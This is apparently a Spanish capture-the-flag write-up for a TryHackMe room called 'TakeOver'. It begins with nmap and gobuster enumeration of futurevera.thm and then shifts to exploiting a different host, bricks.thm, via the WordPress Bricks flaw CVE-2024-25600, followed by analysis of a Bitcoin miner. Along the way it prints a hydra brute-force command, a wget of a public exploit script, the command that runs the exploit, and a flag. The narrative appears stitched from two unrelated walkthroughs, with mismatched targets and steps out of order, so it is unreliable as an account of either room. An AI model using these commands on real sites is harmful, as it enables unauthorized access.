---
title: "TakeOver"
platform: "THM"
publishedAt: 2025-05-13
cover: "/images/ctf/takeover-cover.webp"
preview: "This challenge revolves around subdomain enumeration."
tags: [OSINT]
link: "https://tryhackme.com/room/"
toc:
  - text: "🕵️ Introducción"
    id: "introduccion"
  - text: "🔍 1. Reconocimiento"
    id: "1-reconocimiento"
  - text: "🔢 2. Puertos abiertos y Enumeración de servicios"
    id: "2-puertos-abiertos-y-enumeracion-de-servicios"
  - text: "🔎 3. Análisis e  investigación"
    id: "3-analisis-e-investigacion"
  - text: "💣 4. Acceso inicial o administrativo"
    id: "4-acceso-inicial-o-administrativo"
  - text: "🔓 5. Explotación"
    id: "5-explotacion"
  - text: "🐚 6. Post-explotación"
    id: "6-post-explotacion"
  - text: "🔍 7. Proceso y servicio sospechoso"
    id: "7-proceso-y-servicio-sospechoso"
  - text: "📁 Análisis del miner"
    id: "analisis-del-miner"
  - text: "🔓 Decodificación de wallet"
    id: "decodificacion-de-wallet"
  - text: "🕵️‍♂️ 8. Asociación con grupo de amenazas"
    id: "8-asociacion-con-grupo-de-amenazas"
  - text: "🧠 9. IOCs (Indicators of Compromise)"
    id: "9-iocs-indicators-of-compromise"
  - text: "📝 10. Conclusión"
    id: "10-conclusion"
---

---


## 🕵️ Introducción 


Recientemente, hackerss contactaron a  co-founders of futurevera.thm diciendo que podrían tomar el control y piden un gran rescate. 

<details>
<summary>Herramientas y recursos externos utilizados </summary>
> [https:/](https://github.com/Chocapikk/CVE-2024-25600)

</details>


```shell
root@ip-10-10-159-35:~/Desktop# echo "10.10.227.180 futurevera.thm" | sudo tee -a /etc/hosts
10.10.227.180 futurevera.thm
root@ip-10-10-159-35:~/Desktop# cat /etc/hosts
127.0.0.1	localhost
127.0.0.1       vnc.tryhackme.tech
127.0.1.1	tryhackme.lan	tryhackme

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.227.180 futurevera.thm
```


## 🔍 1. Reconocimiento


```shell
root@ip-10-10-159-35:~/Desktop# sudo nmap -sCV -p- 10.10.227.180 -oN futurevera.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-14 02:39 BST
Nmap scan report for futurevera.thm (10.10.227.180)
Host is up (0.00019s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://futurevera.thm/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: FutureVera
| ssl-cert: Subject: commonName=futurevera.thm/organizationName=Futurevera/stateOrProvinceName=Oregon/countryName=US
| Not valid before: 2022-03-13T10:05:19
|_Not valid after:  2023-03-13T10:05:19
| tls-alpn: 
|_  http/1.1
MAC Address: 02:19:3D:5B:1C:3F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


---


## 🔢 2. Puertos abiertos y Enumeración de servicios

- **22/tcp**  –  OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
- **80/tcp** – http     Apache httpd 2.4.41 ((Ubuntu))

    http-server-header: Apache/2.4.41 (Ubuntu)
    http-title: Did not follow redirect to [https://futurevera.thm/](https://futurevera.thm/)

- **443/tcp** –  ssl/http Apache httpd 2.4.41 ((Ubuntu))

    http-server-header: Apache/2.4.41 (Ubuntu)
    http-title: FutureVera
    ssl-cert: Subject: commonName=futurevera.thm/organizationName=Futurevera/stateOrProvinceName=Oregon/countryName=US


    MAC Address: 02:19:3D:5B:1C:3F (Unknown)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


### Enumeración de directorio 


```shell
gobuster dir -u http://10.10.227.180 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Directorio encontrado 
/server-status        (Status: 403) [Size: 278]
```


---


Revise la version del servidor apache  y parece ser vulnerable a un desbordamiento de búfer con esta CVE-2021-44790


Lance gobuster para encontar archivos .lua 


```shell
gobuster dir -u https://futurevera.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x lua -k
===============================================================
/assets               (Status: 301) [Size: 319] [--> https://futurevera.thm/assets/]
/css                  (Status: 301) [Size: 316] [--> https://futurevera.thm/css/]
/js                   (Status: 301) [Size: 315] [--> https://futurevera.thm/js/]
/server-status        (Status: 403) [Size: 280]
Progress: 436550 / 436552 (100.00%)
```


buscamos en el /js  algo util > solo la version de Bootstrap


Start Bootstrap - One Page Wonder v6.0.4 ([https://startbootstrap.com/theme/one-page-wonder](https://startbootstrap.com/theme/one-page-wonder))

- Copyright 2013-2021 Start Bootstrap

## 🔎 3. Análisis e  investigación  


###  Enumeración de WordPress


Usando `curl` y `wpscan`, identificamos que el tema activo es **Bricks**.


Al buscar vulnerabilidades conocidas, encontramos el CVE:

- **CVE-2024-25600**: vulnerabilidad crítica que permite ejecución remota de comandos desde el editor del tema Bricks.

## 💣 4. Acceso inicial o administrativo


Tras enumerar el usuario `administrator`, ejecutamos fuerza bruta con `hydra` y obtenemos acceso:


```shell
hydra -l administrator -P rockyou.txt https://bricks.thm -s 443 -S -f \
http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=Location: /wp-admin/"
```


![image.png](/images/ctf/takeover-0.webp)


Se encontro un sobdominio support.futurevera.thm 


DNS Name
secrethelpdesk934752.support.futurevera.thm


## 🔓 5. Explotación


Usamos el exploit público para el CVE-2024-25600:


```shell
wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/main/CVE-2024-25600.py
```


---


Al ejecutarlo con credenciales válidas, logramos ejecutar comandos remotos y abrir una **shell interactiva**:


```shell
python3 CVE-2024-25600.py --url https://bricks.thm --username administrator --password ***** --cmd id
```


## 🐚 6. Post-explotación


### 
Accedemos a `/var/www/html/` y encontramos la flag inicial:


```plain text
THM{fl46_650c844110baced87e1606453b93f22a}
```


---


## 🔍 7. Proceso y servicio sospechoso


Revisamos los procesos activos y servicios del sistema, encontrando uno sospechoso:


```shell
ubuntu.service - TRYHACK3M
ExecStart=/lib/NetworkManager/nm-inet-dialog
```


---


El proceso asociado es: `nm-inet-dialog`.


---


## 📁 Análisis del miner


Identificamos el archivo de log del minero en:


```shell
/lib/NetworkManager/inet.conf
```


Este archivo contiene líneas como:


```plain text
[*] Bitcoin Miner Thread Started
```


Y una clave codificada como:


```plain text
ID: WW1NeGNY...
```


## 🔓 Decodificación de wallet


Decodificando el valor de `ID` en base64 (tres veces), obtenemos:


```plain text
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```


Una dirección de Bitcoin válida (Bech32) usada para recibir ganancias del minero.


## 🕵️‍♂️ 8. Asociación con grupo de amenazas



Rastreando la dirección en fuentes OSINT, encontramos que ha sido usada en transacciones ligadas al grupo de ransomware **LockBit**.




---


## 🧠 9. IOCs (Indicators of Compromise)


IPs, hashes, URLs, etc.


## 📝 10. Conclusión


Este reto combina:

- Enumeración de WordPress
- Explotación real de CVE
- Escalada post-explotación
- Análisis forense y OSINT

![takeover.png](/images/ctf/takeover-1.webp)

